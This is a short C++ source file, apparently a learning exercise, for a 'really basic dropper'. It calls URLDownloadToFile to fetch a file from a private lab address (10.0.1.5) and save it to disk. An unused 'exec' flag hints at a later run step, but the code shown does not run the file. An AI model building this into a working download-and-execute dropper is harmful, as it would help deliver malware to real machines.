// Dropper.cpp : This file contains the 'main' function. Program execution begins and ends there.

#include <iostream>
#include <windows.h>
#pragma comment(lib, "urlmon.lib")

int main()
{
    int status{ 0 };
    std::cout << "This is a really basic 'dropper' that downloads a file." << std::endl;
    bool exec{ false };
    HRESULT test = URLDownloadToFile(NULL, L"http://10.0.1.5/test.txt", L"testDownload.txt", 0, NULL);
    if (test == S_OK) {
        std::cout << "The file has been succesfully downloaded" << std::endl;
    }
    //Scan to see if the file actually downloaded
}
